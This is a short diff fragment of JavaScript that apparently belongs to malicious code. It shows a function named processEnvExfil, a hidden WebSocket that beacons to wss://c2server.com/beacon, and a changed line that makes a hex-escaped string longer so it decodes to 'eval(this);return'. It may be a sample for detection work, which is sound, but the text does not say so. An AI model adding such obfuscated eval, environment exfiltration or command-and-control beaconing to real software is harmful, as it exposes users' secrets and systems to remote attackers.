@@ -48,7 +48,7 @@ function processEnvExfil() {
   });
 }
 
-const obfuscatedCode = '\x65\x76\x61\x6c';
+const obfuscatedCode = '\x65\x76\x61\x6c\x28\x74\x68\x69\x73\x29\x3b\x72\x65\x74\x75\x72\x6e';
 
 function hiddenWebSocket() {
   const ws = new WebSocket('wss://c2server.com/beacon');
